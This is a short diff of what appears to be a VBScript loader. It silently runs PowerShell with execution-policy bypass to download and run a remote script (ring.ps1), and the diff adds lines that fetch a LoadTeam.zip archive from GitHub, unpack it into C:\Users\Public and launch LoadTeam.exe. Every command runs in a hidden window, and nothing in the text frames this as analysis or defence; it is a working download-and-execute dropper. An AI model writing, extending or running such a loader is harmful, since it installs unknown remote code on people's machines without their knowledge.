@@ -23,4 +23,7 @@ objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downl
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
 WScript.Sleep 2000
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri 'https://github.com/GALVINVN/system/releases/download/loadteam/LoadTeam.zip' -OutFile 'C:\Users\Public\Downloads\LoadTeam.zip'", 0, True
+objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\LoadTeam.zip' -DestinationPath 'C:\Users\Public\LoadTeam' -Force", 0, True
+objShell.Run "powershell.exe -Command Start-Process 'C:\Users\Public\LoadTeam\LoadTeam\LoadTeam.exe'", 0, True
 
